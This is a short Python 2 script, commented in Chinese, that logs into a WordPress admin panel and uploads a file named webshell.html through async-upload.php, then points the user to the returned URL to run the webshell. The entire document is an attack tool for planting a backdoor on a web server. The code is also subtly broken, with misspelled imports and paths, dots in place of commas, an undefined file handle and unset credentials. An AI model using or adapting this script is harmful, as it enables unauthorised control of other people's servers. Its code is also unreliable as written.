import os, stat, mimetypes, time
import urllib, urllib2, httplib
from cookielib import CoolieJar
"""上传webshell过程"""


def multipart_formdata(fields, files):
	#  设置表单数据
	BOUNDRAY = "--pluploadboundary%s" % (int(time.time())) #  设置分隔符
	L = []
	for (key, value) in fields: #  设置传送数据格式
		L.append('--' + BOUNDRAY)
		L.append('Content-Disposition: form-data; name="%s"' % key)
		L.append("")
		L.append(value)
	for (key, fd) in files: #  设置传送文件
		file_size = os.fstat(fd.fileno())[stat.ST_SIZE]
		filename = fd.name.split('/')[-1]
		contenttype = mimetypes.guess_type(filename)[0] or "application/octet-stream"
		L.append('--' + BOUNDRAY)
		L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
		L.append("Content-Type: %s" % contenttype)
		fd.seek(0)
		L.append("\r\n" + fd.read())
	L.append('--' + BOUNDRAY + '--')
	L.append("")
	body = "\r\n".join(L)
	content_type = "multipart/form-data; boundary=%s" % BOUNDRAY
	return content_type, body


def cookiejar():
	#  cookie记录器
	cj = CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))	
	url = "http://server/wordpress/wp-login.php"
	values = {"log": username, "pwd": password} #  此处需要填写
	headers = {"User-Agent": "Mozilla/4.0", "Referer": "http://server/wordpress/wp-admin/"}
	data = urllib.urlencode(values)
	request = urllib2.Request(url, data, headers)
	response = opener.open(request)
	return opener


def main():
	#  上传文件
	url = "http://server/wordpress/wp-admain/async-upload.php"
	fields = [("post_id", "XXX"), ("_wpnonce", "XXX"), ("action", "upload-attachment"), ("name", "webshell.html")] #  XXX可由HTTP Analyzer得到
	with open("webshell.html", "rb") as f:
		files =[("async-upload", fd)]
		content_type, body = multipart_formdata(fields, files)
		headers = {"User-Agent": "Mozilla/4.0", "Content-Type": content_type}
		request = urllib2.Request(url. body. headers)
		opener = cookiejar()
		response = opener.open(request)
	print(response.read) #  打开返回数据中webshell存储位置的url即可运行webshell


if __name__ == '__main__':
	main()